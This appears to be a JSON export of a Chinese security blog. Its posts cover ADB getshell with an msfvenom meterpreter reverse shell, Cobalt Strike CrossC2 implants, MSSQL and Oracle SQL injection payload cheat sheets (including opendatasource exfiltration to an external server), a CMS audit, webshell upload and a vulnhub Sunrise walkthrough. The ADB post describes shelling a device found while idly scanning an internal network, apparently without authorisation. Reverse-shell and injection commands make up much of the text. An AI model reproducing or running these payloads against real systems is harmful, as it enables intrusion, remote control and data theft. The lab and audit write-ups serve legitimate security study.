{"meta":{"title":"Hu5k7's Blog","subtitle":null,"description":null,"author":"Hu5k7","url":"https://hu5k7.github.io","root":"/"},"pages":[{"title":"archives","date":"2020-07-10T10:40:59.000Z","updated":"2020-07-10T02:40:59.410Z","comments":true,"path":"archives/index.html","permalink":"https://hu5k7.github.io/archives/index.html","excerpt":"","text":""},{"title":"category","date":"2020-07-10T11:30:46.000Z","updated":"2020-07-10T03:30:46.090Z","comments":true,"path":"category/index.html","permalink":"https://hu5k7.github.io/category/index.html","excerpt":"","text":""},{"title":"friends","date":"2020-07-10T11:32:01.000Z","updated":"2020-07-10T04:17:50.961Z","comments":true,"path":"friends/index.html","permalink":"https://hu5k7.github.io/friends/index.html","excerpt":"","text":"友链"}],"posts":[{"title":"Mark_Android_GetShell","slug":"takeshell-02","date":"2020-08-30T21:47:58.000Z","updated":"2020-08-30T14:43:14.010Z","comments":true,"path":"2020/08/31/takeshell-02/","link":"","permalink":"https://hu5k7.github.io/2020/08/31/takeshell-02/","excerpt":"0x00 前言 hvv停止，呆酒店，无聊扫内网，找到一台开着5555端口的ADB调试口，试着getshell","text":"0x00 前言 hvv停止，呆酒店，无聊扫内网，找到一台开着5555端口的ADB调试口，试着getshell 使用到的工具: msfvenom adb (Android调试工具) 0x01 准备工作 连接安卓adb调试口 adb connect 查看是否设备列表 adb devices 返回kali生成马 msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.49.161 LPORT=10001 R &gt; apk.apk adb install 安装上去。 查找 安装的APK包 adb shell pm list packages 因为 单单对着包名appPackage 运行是运行不起来的。需要再查询appActivity adb shell dumpsys package XXXX 返回KALI 开启 MSF 开始设置payload 并监听 use exploit/multi/handler set payload android/meterpreter/reverse_tcp adb shell am start -W -N com.metasploit.stage/.MainActivity","categories":[],"tags":[{"name":"Getshell_Note","slug":"Getshell-Note","permalink":"https://hu5k7.github.io/tags/Getshell-Note/"}]},{"title":"Mark_OnceBuild_CrossC2Object","slug":"Mark-OnceBuild-CrossC2Object","date":"2020-07-10T12:34:09.000Z","updated":"2020-07-13T06:14:51.531Z","comments":true,"path":"2020/07/10/Mark-OnceBuild-CrossC2Object/","link":"","permalink":"https://hu5k7.github.io/2020/07/10/Mark-OnceBuild-CrossC2Object/","excerpt":"0x00 前言 在公司项目上，帮客户测试内网安全，有一个linux系统，然后cs生成不了Linux🐎，于是我就找到了CrossC2插件，但是呢，CrossC2有一些有点问题，这里记一次使用CrossC2的踩坑记","text":"0x00 前言 在公司项目上，帮客户测试内网安全，有一个linux系统，然后cs生成不了Linux🐎，于是我就找到了CrossC2插件，但是呢，CrossC2有一些有点问题，这里记一次使用CrossC2的踩坑记 0x01 CrossC2 介绍 CrossC2 是一款，可以生成 Linux / MacOS 的🐎，蛮强的 0x02 CrossC2 使用 从Github上面git clone 下来有三个文件，Linux后缀是生成Linux🐎 则 MacOS就是苹果系统的🐎 CrossC2.cna 是Cobalt Strike 的插件。最主要要改动的地方是 77行。之后在CS上加上插件就能看到了。 我是不推荐从插件里生成拉，那样生成的不是很有效果。 大部分我都是直接使用主程序生成🐎。CrossC2都会给你默认参数，第一个默认的就已经很常用了 注意:这里是要放进 cs 目录下的，为了方便截图就移出来了 注意:这里是要放进 cs 目录下的，为了方便截图就移出来了 注意:这里是要放进 cs 目录下的，为了方便截图就移出来了 重要的事情说三遍 0x03 CrossC2的坑 开启cs，监听https，坑就在这里 CrossC2 走的必须是https 才能回显","categories":[],"tags":[{"name":"note","slug":"note","permalink":"https://hu5k7.github.io/tags/note/"}]},{"title":"iseacms代码审计入门级","slug":"iseacms代码审计入门级","date":"2020-05-13T17:38:00.000Z","updated":"2020-07-10T06:33:48.310Z","comments":true,"path":"2020/05/14/iseacms代码审计入门级/","link":"","permalink":"https://hu5k7.github.io/2020/05/14/iseacms代码审计入门级/","excerpt":"0x01 iseacms 熊海CMS 介绍🅰️ 熊海CMS是由熊海开发的一款可广泛应用于个人博客，个人网站，企业网站的一套网站综合管理系统。 简的来说，就非常合适刚刚入门的 代码审计案例（简单到会看一点点php代码的人都会的审计），今天来复盘一下","text":"0x01 iseacms 熊海CMS 介绍🅰️ 熊海CMS是由熊海开发的一款可广泛应用于个人博客，个人网站，企业网站的一套网站综合管理系统。 简的来说，就非常合适刚刚入门的 代码审计案例（简单到会看一点点php代码的人都会的审计），今天来复盘一下 （其实已经复盘过了，只是再复盘一遍来充实blog，嘻嘻😄） 0x02 实战 需要用到 seay源代码审计系统 个人喜欢直接上 自动审计所以，走一波 seay自动审计出来的，一般不一定100%存在漏洞，它原理是正则去匹配那些函数，比如 eval() 可能就 会写上关于eval() 函数的正则匹配。嘛。不过比起手动慢慢的看，能省去很多麻烦。有能力的也可以先代码通读 再自动化审计，每个人方法不一，我就 用我的方法。 点过去看到，带有正则匹配和转义的函数。 正则匹配**\\W** 写死了。 接着往上看 /seacmseditor/php/controller.php：11行 这三个存在漏洞且能利用。 需要GET传参 action, switch 多选函数. 先第一个uploadfile 上传打开抓包上传试一下。 unicode 解码看一下\\u672a\\u77e5\\u9519\\u8bef =&gt; 未知错误 🙅 完美，未知错误 下一个，SQL注入 0x03 多处SQL注入 /files/content.php：19行 加了 转义函数 可以使用 宽字节注入(有条件) 报错注入 这里就使用 报错注入 把 宽字节注入需要 GBK编码 白盒审计 源代码 里明显没有单独设置 编码所以是不行的。 成功报出数据库 同样存在SQL注入的文件: /files/software.php /admin/files/reply.php /admin/files/newlink.php","categories":[],"tags":[{"name":"code","slug":"code","permalink":"https://hu5k7.github.io/tags/code/"}]},{"title":"Mark-once-WebShell_01","slug":"takeshell-01","date":"2020-04-09T20:51:27.000Z","updated":"2020-07-10T06:34:28.766Z","comments":true,"path":"2020/04/10/takeshell-01/","link":"","permalink":"https://hu5k7.github.io/2020/04/10/takeshell-01/","excerpt":"0x01 起因🏴 在做SRC活动的时候。扫描到一个 网站源码备份的网站，于是就打算进一步渗透。看看能不能拿SHELL","text":"0x01 起因🏴 在做SRC活动的时候。扫描到一个 网站源码备份的网站，于是就打算进一步渗透。看看能不能拿SHELL 0x02 网站SQL注入 代码审计功底不太熟，就简单分析了一下文件内容。 知道了后台管理是/**system/下。然后就去网站看看能不能发现其他的漏洞 先走个流程信息收集下。 惊了。Iis8.5 惹不起惹不起。 在一个地方找到了一个SQL注入 得劲🔥 发现sqlmap跑不出 密码❔于是 我上手工了 🖤得嘞。。直接扔进SOMD5里解密。 登录后台看看 。。。 。。。 。。。 找了一些。能上传的地方，但是都失败了。经验不足不太会。😩 正思考咋办的时候。突然灵光一闪🌞,咱们不是还有SQL注入嘛。还是MSSQL的数据库 直接上OS-SHELL 0x03 WEBSHELL 🌄 权限有点低嗷。🉑 上传一句话aspx小马 百度云的主机，惹不起 。。 。。 。。 到这里我也就不继续深究了。该删木马的都删了 本人菜鸟经验不足。提权那些。240个补丁，提不上。也没python环境，","categories":[],"tags":[{"name":"Getshell_Note","slug":"Getshell-Note","permalink":"https://hu5k7.github.io/tags/Getshell-Note/"}]},{"title":"MSSQL_Blind_Injection","slug":"MSSQL盲注","date":"2020-02-24T01:57:29.000Z","updated":"2020-07-10T06:34:57.185Z","comments":true,"path":"2020/02/24/MSSQL盲注/","link":"","permalink":"https://hu5k7.github.io/2020/02/24/MSSQL盲注/","excerpt":"0x00 前言 不要问我为什么不配图。因为这个hexo老是渲染失败。搞的我直接裂开了。","text":"0x00 前言 不要问我为什么不配图。因为这个hexo老是渲染失败。搞的我直接裂开了。 0x01 MSSQL盲注_前期知识 了解前。先有两个函数要先了解一下count(),object_id() 1.union all select count(*) from dbo.sysobjects union all select count(*) from dbo.sysobjects count指是查询表的所有记录数，也就是无需去order by查询字段数。就能达成回显(只限于盲注8?) ========================================= ?id=1 union all select null,db_name(),null //查询当前库名 ?id=1 union all select dbid,name,null from master.dbo.sysdatabases //查询当前所有库 dbid 是指数据库的id, master.dbo.sysdatabases 则是来查询库 ========================================== object_id() 简单的一句话总结就是 免去了 查询id unino all select null,name,null from dbo.syscolumns where id=object_id('dbo.admin') //要注意这里要加单引号括起来 0x02 MSSQL盲注 #查询库名长度 ?id=1 and (select count(*)from master.dbo.databases where dbid=1 and len(name)=4)=1 ==================================================== #查询库名 ?id=1 and (select count(*) from master.dbo.databases where dbid=1 and ascii(substring(name,1,1))=100)=1 =================================================== #查询表名 ?id=1 and (select count(*) from dbo.sysobjects where name in(select top 1 name from dbo.sysobjects where xtype='U')and ascii(substring(name,1,1))=100)=1 ?id=1 and (select count(*) from dbo.sysobjects where name in(select top 1 name from dbo.sysobjects where xtype='U' and name not in('zkaq'))and ascii(substring(name,1,1))=100)=1 tips: (top 1) 是指查询最大值的那一个 ================================================== #查询字段名 (假设已猜出表名(zkaq666)) ?id=1 and (select count(*)from dbo.sysobjects where name in(select top 1 name from dbo.sysobjects where id=object_id('dbo.zkaq666'))and ascii(substring(name,1,1))=100)=1 ==================================================== #查询字段内容 (假设已猜出字段名(username)) ?id=1 and (select count(*) from dbo.zkaq666 where username in(select top 1 username from dbo.zkaq666)and ascii(substring(username,1,1))=100)=1 0x03 总结 很他妈简单。看不懂的自己去试一试！ 参考连接link: https://blog.csdn.net/v_gbird/article/details/93981684 https://blog.csdn.net/kuxing100/article/details/9670533","categories":[],"tags":[{"name":"Note","slug":"Note","permalink":"https://hu5k7.github.io/tags/Note/"}]},{"title":"Oracle Injection","slug":"Oracle注入","date":"2020-02-19T19:57:37.000Z","updated":"2020-07-10T06:35:05.559Z","comments":true,"path":"2020/02/20/Oracle注入/","link":"","permalink":"https://hu5k7.github.io/2020/02/20/Oracle注入/","excerpt":"0x01 显错注入🔥","text":"0x01 显错注入🔥 所用到的语句 and 1=ctxsys.drithsx.sn(1,(payload)) table_name&lt;&gt;‘ADMIN’ //&lt;&gt;意思是 不等于。也就是排除 and 1=ctxsys.drithsx.sn(1,(select table_name from user_tables from rownum=1)) ⏫rownum指，限制输出只输出一个。查询表 and 1=ctxsys.drithsx.sn(1,(select column_name from user_tab_columns where table_name=‘ADMIN’ and rownum=1))","categories":[],"tags":[{"name":"Note","slug":"Note","permalink":"https://hu5k7.github.io/tags/Note/"}]},{"title":"MSSQL Injection","slug":"MSSQL注入","date":"2020-02-19T19:57:29.000Z","updated":"2020-07-10T06:34:44.344Z","comments":true,"path":"2020/02/20/MSSQL注入/","link":"","permalink":"https://hu5k7.github.io/2020/02/20/MSSQL注入/","excerpt":"0x01 显错注入🔥","text":"0x01 显错注入🔥 union all select db_name() //查询当前库名 union all select null,name,null from master.dbo.sysdatabases //查询数据库 union all select null,null,null from dbo.sysobjects //查询表 union all select null,null,null from dbo.syscolumns //查询字段 查询数据库💻 ?id=1 union all select null,name,null from master.dbo.stsdatabases 查询表名📑 ?id=1 union all select id,name,null from dbo.sysobjects where xtype=‘U’ ⏫id 和 name 是系统自带的字段名。查询完需要记住，你要查询的表ID。xtype='U’是指用户创建的表 查询字段名 ?id=1 union all select null,name,null from dbo.syscolumns where id=xxxxxx ⏫ null是指3个字段。mssql里的字符串类型管理严格，有可能一个是int类型。或者str类型等。 查询字段内容 ?id=1 union all select null,password,null from admin 0x02 MSSQL 反弹注入🎈 前言: 这个是一个比较骚的操作。针对无回显注入点的时候。 0x02.1 反弹注入原理 ☂️MSSQL注射攻击是最为复杂的数据库攻击技术，由于该数据库功能十分强大，存储过程以及函数语句十分丰富，这些灵活的语句造就了新颖的攻击思路，而反弹注入技术需要依靠opendatasource函数支持 0x02.2 反弹注入条件 🌐需要一台外网主机，字段要相同 复现 Payload🔫 insert into opendatasource(‘sqloledb’,‘server=IP,1433;uid=USERNAME;pwd=PASSWORD;database=DATABASE’).DATABASE.dbo.TABLES select *from admin 句子理解 opendatasource(‘sqloledb’,‘server=IP,1433;uid=USERNAME;pwd=PASSWORD;database=DATABASE’).DATABASE.dbo.TABLES select *from admin 建立temp表4个字段 create table temp(a varchar(255), b varchar(255),c varchar(255),d varchar(255)) 插入语句后查询","categories":[],"tags":[{"name":"Note","slug":"Note","permalink":"https://hu5k7.github.io/tags/Note/"}]},{"title":"vim-vundle install and configuration","slug":"vim-vundle安装和配置","date":"2019-12-15T15:53:01.000Z","updated":"2020-07-10T05:32:39.186Z","comments":true,"path":"2019/12/15/vim-vundle安装和配置/","link":"","permalink":"https://hu5k7.github.io/2019/12/15/vim-vundle安装和配置/","excerpt":"0x00 前言 想在pycharm使用 pwntools 但是 pwntools不支持windows。只能跑到Linux搞，但是Vim没有补全于是打算装个 补全插件。顺便写个笔记","text":"0x00 前言 想在pycharm使用 pwntools 但是 pwntools不支持windows。只能跑到Linux搞，但是Vim没有补全于是打算装个 补全插件。顺便写个笔记 环境：Kali 0x01 Vundle插件管理安装 我用的是kali和普通安装有些不同。 第一步 git： git clone https://github.com/VundleVim/Vundle.vim.git ~/.vim/bundle/Vundle.vim 在 用户 下建立.vimrc文件 例子： user: /user/.vimrc root: /root/.vimrc 写上以下的句子 set nocompatible &quot; be iMproved, required filetype off &quot; required &quot; set the runtime path to include Vundle and initialize set rtp+=~/.vim/bundle/Vundle.vim call vundle#begin() Plugin 'VundleVim/Vundle.vim' Plugin 'tpope/vim-fugitive' Plugin 'L9' call vundle#end() &quot; required filetype plugin indent on &quot; required 打开VIM 直接打开不用配合其他文件什么的。 输入 :PluginInstall。安装完后更新一下 :PluginUpdate 等显示Done！的字的时候就代表的 安装/更新 成功 call vundle#begin() ''' #插件名称位置 call vundle#end() 如果我这里不详细，可以去github看原版的档案 地址：https://github.com/VundleVim/ 0x02 vim安装molokai配色方案 我安装完插件后，字体没了颜色。我也没看出问题所在。字体颜色脚本都没有加载。所以我打算直接使用vim的插件。不使用自带的颜色脚本 直接git 下来 git clone https://github.com/tomasr/molokai.git 然后 mv molokai/ /usr/share/(你的vim版本)/colors/ 下。 并在.vimrc文件 后面加上 colorsheme molokai let g:molokai_original=1 set t_Co=256 set background=drak syntax on set nu! 保存并退出。过会就会生效了。","categories":[{"name":"Note","slug":"Note","permalink":"https://hu5k7.github.io/categories/Note/"}],"tags":[{"name":"Note","slug":"Note","permalink":"https://hu5k7.github.io/tags/Note/"}]},{"title":"vulnhub_sunrise","slug":"vulnhub靶机-sunrise","date":"2019-12-14T18:55:03.000Z","updated":"2020-07-10T05:32:41.764Z","comments":true,"path":"2019/12/15/vulnhub靶机-sunrise/","link":"","permalink":"https://hu5k7.github.io/2019/12/15/vulnhub靶机-sunrise/","excerpt":"0x00 前言 前几天逛了一下vulnhub,看到比较适合新手的靶机。就下载下来玩玩。 可没想到一个坑，坑了我两天半，共用计两天半。 有句话我想讲一下 **************************!!!","text":"0x00 前言 前几天逛了一下vulnhub,看到比较适合新手的靶机。就下载下来玩玩。 可没想到一个坑，坑了我两天半，共用计两天半。 有句话我想讲一下 **************************!!! 0x01 Sunrise 靶机地址: https://download.vulnhub.com/sunset/sunrise.7z 作者: whitecr0wz 难度: Beginner(新手) 0x01.1 信息收集 nmap -n -T4 172.16.123.109 -A Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-14 19:05 CST Stats: 0:00:00 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 7.00% done; ETC: 19:05 (0:00:00 remaining) Nmap scan report for 172.16.123.109 Host is up (0.00011s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0) | ssh-hostkey: | 2048 37:dd:45:a2:9b:e7:bf:aa:30:e3:f0:96:ac:7c:0b:7c (RSA) | 256 b4:c2:9b:4d:6f:86:67:02:cf:f6:43:8b:e2:64:ea:04 (ECDSA) |_ 256 cb:f2:e6:cd:e3:e1:0f:bf:ce:e0:a2:3b:84:ae:97:74 (ED25519) 80/tcp open http Apache httpd 2.4.38 ((Debian)) | http-ls: Volume / | SIZE TIME FILENAME | 612 2019-11-25 05:35 index.nginx-debian.html |_ |_http-server-header: Apache/2.4.38 (Debian) |_http-title: Index of / 3306/tcp open mysql? | fingerprint-strings: | NULL, RPCCheck: |_ Host '172.16.123.230' is not allowed to connect to this MariaDB server 8080/tcp open http-proxy Weborf (GNU/Linux) | fingerprint-strings: | FourOhFourRequest: | HTTP/1.1 404 Page not found: Weborf (GNU/Linux) | Content-Length: 202 | Content-Type: text/html | &lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Weborf&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;H1&gt;Error 404&lt;/H1&gt;Page not found &lt;p&gt;Generated by Weborf/0.12.2 (GNU/Linux)&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; | GetRequest: | HTTP/1.1 200 | Server: Weborf (GNU/Linux) | Content-Length: 326 | &lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Weborf&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;table&gt;&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;Name&lt;/td&gt;&lt;td&gt;Size&lt;/td&gt;&lt;/tr&gt;&lt;tr style=&quot;background-color: #DFDFDF;&quot;&gt;&lt;td&gt;d&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;html/&quot;&gt;html/&lt;/a&gt;&lt;/td&gt;&lt;td&gt;-&lt;/td&gt;&lt;/tr&gt; | &lt;/table&gt;&lt;p&gt;Generated by Weborf/0.12.2 (GNU/Linux)&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; | HTTPOptions, RTSPRequest, SIPOptions: | HTTP/1.1 200 | Server: Weborf (GNU/Linux) | Allow: GET,POST,PUT,DELETE,OPTIONS,PROPFIND,MKCOL,COPY,MOVE | DAV: 1,2 | DAV: &lt;http://apache.org/dav/propset/fs/1&gt; | MS-Author-Via: DAV | Socks5: | HTTP/1.1 400 Bad request: Weborf (GNU/Linux) | Content-Length: 199 | Content-Type: text/html |_ &lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Weborf&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;H1&gt;Error 400&lt;/H1&gt;Bad request &lt;p&gt;Generated by Weborf/0.12.2 (GNU/Linux)&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; | http-methods: |_ Potentially risky methods: PUT DELETE PROPFIND MKCOL COPY MOVE |_http-server-header: Weborf (GNU/Linux) |_http-title: Weborf | http-webdav-scan: | Allowed Methods: GET,POST,PUT,DELETE,OPTIONS,PROPFIND,MKCOL,COPY,MOVE | WebDAV type: Apache DAV |_ Server Type: Weborf (GNU/Linux) 2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service : ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port3306-TCP:V=7.80%I=7%D=12/14%Time=5DF4C1F5%P=x86_64-pc-linux-gnu%r(N SF:ULL,4D,&quot;I\\0\\0\\x01\\xffj\\x04Host\\x20'172\\.16\\.123\\.230'\\x20is\\x20not\\x20a SF:llowed\\x20to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server&quot;)%r(RPCCheck SF:,4D,&quot;I\\0\\0\\x01\\xffj\\x04Host\\x20'172\\.16\\.123\\.230'\\x20is\\x20not\\x20allo SF:wed\\x20to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server&quot;); ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port8080-TCP:V=7.80%I=7%D=12/14%Time=5DF4C1FA%P=x86_64-pc-linux-gnu%r(G SF:etRequest,187,&quot;HTTP/1\\.1\\x20200\\r\\nServer:\\x20Weborf\\x20\\(GNU/Linux\\)\\r SF:\\nContent-Length:\\x20326\\r\\n\\r\\n&lt;!DOCTYPE\\x20HTML\\x20PUBLIC\\x20\\&quot;-//W3C SF://DTD\\x20HTML\\x204\\.01\\x20Transitional//EN\\&quot;&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Weborf&lt; SF:/title&gt;&lt;/head&gt;&lt;body&gt;&lt;table&gt;&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;Name&lt;/td&gt;&lt;td&gt;Size&lt;/td&gt;&lt;/tr&gt; SF:&lt;tr\\x20style=\\&quot;background-color:\\x20#DFDFDF;\\&quot;&gt;&lt;td&gt;d&lt;/td&gt;&lt;td&gt;&lt;a\\x20href SF:=\\&quot;html/\\&quot;&gt;html/&lt;/a&gt;&lt;/td&gt;&lt;td&gt;-&lt;/td&gt;&lt;/tr&gt;\\n&lt;/table&gt;&lt;p&gt;Generated\\x20by\\x2 SF:0Weborf/0\\.12\\.2\\x20\\(GNU/Linux\\)&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;&quot;)%r(HTTPOptions,B2, SF:&quot;HTTP/1\\.1\\x20200\\r\\nServer:\\x20Weborf\\x20\\(GNU/Linux\\)\\r\\nAllow:\\x20GE SF:T,POST,PUT,DELETE,OPTIONS,PROPFIND,MKCOL,COPY,MOVE\\r\\nDAV:\\x201,2\\r\\nDA SF:V:\\x20&lt;http://apache\\.org/dav/propset/fs/1&gt;\\r\\nMS-Author-Via:\\x20DAV\\r\\ SF:n\\r\\n&quot;)%r(RTSPRequest,B2,&quot;HTTP/1\\.1\\x20200\\r\\nServer:\\x20Weborf\\x20\\(GN SF:U/Linux\\)\\r\\nAllow:\\x20GET,POST,PUT,DELETE,OPTIONS,PROPFIND,MKCOL,COPY, SF:MOVE\\r\\nDAV:\\x201,2\\r\\nDAV:\\x20&lt;http://apache\\.org/dav/propset/fs/1&gt;\\r\\ SF:nMS-Author-Via:\\x20DAV\\r\\n\\r\\n&quot;)%r(FourOhFourRequest,12B,&quot;HTTP/1\\.1\\x20 SF:404\\x20Page\\x20not\\x20found:\\x20Weborf\\x20\\(GNU/Linux\\)\\r\\nContent-Leng SF:th:\\x20202\\r\\nContent-Type:\\x20text/html\\r\\n\\r\\n&lt;!DOCTYPE\\x20HTML\\x20PU SF:BLIC\\x20\\&quot;-//W3C//DTD\\x20HTML\\x204\\.01\\x20Transitional//EN\\&quot;&gt;&lt;html&gt;&lt;hea SF:d&gt;&lt;title&gt;Weborf&lt;/title&gt;&lt;/head&gt;&lt;body&gt;\\x20&lt;H1&gt;Error\\x20404&lt;/H1&gt;Page\\x20no SF:t\\x20found\\x20&lt;p&gt;Generated\\x20by\\x20Weborf/0\\.12\\.2\\x20\\(GNU/Linux\\)&lt;/p SF:&gt;&lt;/body&gt;&lt;/html&gt;&quot;)%r(Socks5,125,&quot;HTTP/1\\.1\\x20400\\x20Bad\\x20request:\\x20 SF:Weborf\\x20\\(GNU/Linux\\)\\r\\nContent-Length:\\x20199\\r\\nContent-Type:\\x20t SF:ext/html\\r\\n\\r\\n&lt;!DOCTYPE\\x20HTML\\x20PUBLIC\\x20\\&quot;-//W3C//DTD\\x20HTML\\x2 SF:04\\.01\\x20Transitional//EN\\&quot;&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Weborf&lt;/title&gt;&lt;/head&gt;&lt;b SF:ody&gt;\\x20&lt;H1&gt;Error\\x20400&lt;/H1&gt;Bad\\x20request\\x20&lt;p&gt;Generated\\x20by\\x20We SF:borf/0\\.12\\.2\\x20\\(GNU/Linux\\)&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;&quot;)%r(SIPOptions,B2,&quot;HTT SF:P/1\\.1\\x20200\\r\\nServer:\\x20Weborf\\x20\\(GNU/Linux\\)\\r\\nAllow:\\x20GET,PO SF:ST,PUT,DELETE,OPTIONS,PROPFIND,MKCOL,COPY,MOVE\\r\\nDAV:\\x201,2\\r\\nDAV:\\x SF:20&lt;http://apache\\.org/dav/propset/fs/1&gt;\\r\\nMS-Author-Via:\\x20DAV\\r\\n\\r\\ SF:n&quot;); MAC Address: 00:0C:29:22:ED:7F (VMware) Device type: general purpose Running: Linux 3.X|4.X OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 OS details: Linux 3.2 - 4.9 Network Distance: 1 hop Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE HOP RTT ADDRESS 1 0.11 ms 172.16.123.109 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 142.97 seconds 开放的端口: ​ 22/tcp ssh openssh 7.9 ​ 80/tcp http apache ​ 3306/tcp mysql? ​ 8080/tcp http-proxy Weborf 80/tcp http 没有任何东西 mysql连不上 看向 8080端口 看了看版本 用searchsploit搜索一下看看有没有漏洞存在 存在目录穿梭 看了看具体payload: GET /..%2f..%2f..%2f..%2fetc%2fpasswd 就是把 / 转成 html编码 %2f 成功。 目录穿梭最主要的就是找 敏感文件信息. 看看有没有敏感文件尤其是 历史记录那些，配置文件等 GET /..%2f..%2f..%2fhome%2f home下存在两个用户,两个用户下存在的文件： sunrise |_user.txt weborf |_weborf源码 注意！这里是短路的路口，user.txt 是一个坑。重点不在这里 想到端口开放了mysql，于是就百度了一下 mysql的敏感文件 /usr/local/app/apache2/conf/httpd.conf #apache2缺省配置文件 /usr/local/apache2/conf/httpd.conf /usr/local/app/apache2/conf/extra/httpd-vhosts.conf #虚拟网站设置 /usr/local/app/php5/lib/php.ini #PHP相关设置 /etc/sysconfig/iptables #从中得到防火墙规则策略 /etc/httpd/conf/httpd.conf #apache配置文件 /etc/rsyncd.conf #同步程序配置文件 /etc/my.cnf #mysql的配置文件 /etc/redhat-release #系统版本 /etc/issue /etc/issue.net etc/passwd #存储操作系统用户信息,该文件为所有用户可见 用户名: 密码 : uid : gid :用户描述：主目录：登陆shell 密码：x表示暗文,相反为明文 uid：userid,”0”为root ID.1-99为系统保留,分配给系统预定义帐号。Linux用户可以分为3类：超级用户（root）、管理用户和普通用户 伪用户（psuedo users） bin #拥有可执行的用户命令文件 sys #拥有系统文件 adm #拥有账户文件 uucp #UUCP使用 Ip #Ip或lpd子系统使用 nobody #NFS使用 audit cron mail usenet gid:字段记录的是用户所属的用户组。对应着/etc/group文件中的一条记录 用户描述：字段记录着用户的一些个人情况，例如用户的真实姓名、电话、地址等 主目录：用户的起始工作目录 登陆shell： 常用shell - sh(BourneShell),csh(CShell),ksh(KornShell),tcsh(TENEX/TOPS-20typeCShell),bash(BourneAgainShell) /bin/sh #默认登录Shell /sbin/nologin #代表用户不能登录 /etc/shadow username: passwd: lastchg: min: max: warn: inactive: expire: flag 登录名:加密口令:最后一次修改时间:最小时间间隔:最大时间间隔:警告时间:不活动时间:失效时间:标志 口令 - 加密后的用户口令字，13个字符；如果为空/用户没有口令；如含有不属于集合{./0-9A-Za-z}中的字符/用户不能登录 最后一次修改时间 - 表示的是从某个时刻起，到用户最后一次修改口令时的天数。时间起点对不同的系统可能不同 最小时间间隔 - 两次修改口令之间所需的最小天数 最大时间间隔 - 口令保持有效的最大天数 警告时间 - 从系统开始警告用户到用户密码正式失效之间的天数 不活动时间 - 用户没有登录活动但账号仍能保持有效的最大天数 失效时间 - 账号的生存期。 保留条目 - 无用字段 /etc/group 存储有关本地用户组的信息 一个组中可以有多个用户，一个用户也可以属于不同的组。当一个用户同时是多个组中的成员时，在/etc/passwd文件中记录的是登录时所属的默认组 用户要访问属于附加组的文件时，必须首先使用newgrp命令使自己成为所要访问的组中的成员 1）groupname GID #组名 2）password #密码位置 3）GID #组ID 4）user #组成员 /usr/local/app/php5/lib/php.ini #PHP相关设置 /usr/local/app/apache2/conf/extra/httpd-vhosts.conf #虚拟网站设置 /etc/httpd/conf/httpd.conf或/usr/local/apche/conf/httpd.conf #linux APACHE虚拟主机配置文件 /usr/local/resin-3.0.22/conf/resin.conf #3.0.22的RESIN配置文件 /usr/local/resin-pro-3.0.22/conf/resin.conf /usr/local/app/apache2/conf/extra/httpd-vhosts.conf #APASHE虚拟主机 /etc/httpd/conf/httpd.conf或/usr/local/apche/conf /httpd.conf #linux APACHE虚拟主机配置文件 /usr/local/resin-3.0.22/conf/resin.conf #3.0.22的RESIN配置文件 /usr/local/resin-pro-3.0.22/conf/resin.conf /usr/local/app/apache2/conf/extra/httpd-vhosts.conf #APASHE虚拟主机 /etc/sysconfig/iptables #查看防火墙策略 /root/.mysql_history、/root/.bash_history #Mysql账号密码信息 最后一个**.mysql_history** #mysql账号密码信息 这里写的是/root/用户，就猜想是否存在两个用户里面 GET /..%2f..%2f..%2fhome%2fweborf%2f.mysql_history 找到 weborf 用户的密码。 使用ssh登入上去 登入成功！！！ 到这一步就可以开始渗透提权了 0x01.2 提权 发现用户的等级不是很高。打算来提权一下 想到之前的mysql有半开放的状态。于是有个猜想。 是不是只允许本地登入mysql，测试了一下 登入成功！ 查询了一番数据库发现存在另一个用户的密码。 现在得到了 另一个用户的 密码。 现在切换用户 发现权限也不是特别高。不过算是进入了正常的用户了。 开始提权 sudo su 测试了一下，发现不行 在百思不得其解的时候。去问了问一些大佬。 有个大佬跟我说看看有没有 wine，可以用wine 建立反向连接。再用sudo -l 查一下该用户有那些权限 存在。 sudo -l #显示出自己（执行 sudo 的使用者）的权限 scp 传了下msfveom windows 反向连接 scp muma.exe sunrise@172.16.123.109:/home/sunrise/muma.exe 开始反弹。 0x01.3 查看flag 试试是否能直接读取root.txt cat /root/root.txt 